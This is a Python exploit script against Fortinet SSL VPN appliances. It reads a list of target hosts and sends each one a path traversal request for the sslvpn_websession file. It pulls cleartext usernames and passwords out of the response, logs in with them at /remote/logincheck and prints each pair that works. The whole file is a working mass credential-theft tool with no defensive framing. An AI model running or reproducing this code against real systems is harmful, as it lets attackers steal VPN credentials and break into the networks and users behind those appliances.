import sys,os,re,requests
import urllib3, string
urllib3.disable_warnings()
PRINTABLE = set(bytes(string.printable, 'ascii'))
from host import host
from requests.exceptions import *
class fortExploit:
    def fortExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        pattern_1 = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                url = vulnerable_host[a]
                address = host.Host.addressRegex(url)
                link = "https://" + address['ip'] + ":10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
                session = requests.get(link, verify=False, timeout=10)
                matchIp = re.search(pattern_1, session.text)
                if matchIp is not None:
                    creds = matchIp.group()
                    credz = creds.split('root')
                    user = credz[0]
                    test = user.replace('\x00', ' ')
                    test2 = ' '.join(test.split())
                    credentials = test2.split()
                    user = credentials[1]
                    password = credentials[2]
                    ip = re.search(pattern_1, url)
                    data = {'ajax': '1', 'username':user, 'credential':password}
                    link = "https://"+ address['ip'] + ":" + "10443" +"/remote/logincheck"
                    login = requests.post(url=link,data=data, verify=False)
                    if ('denied' not in login.text) and ('tokeninfo' not in login.text):
                        print("CORRECT Found credentials {}:{} at {}\n".format(credentials[1],credentials[2],link))
            except ConnectTimeout:
                pass
            except ConnectionError:
                pass
            finally:
                a += 1
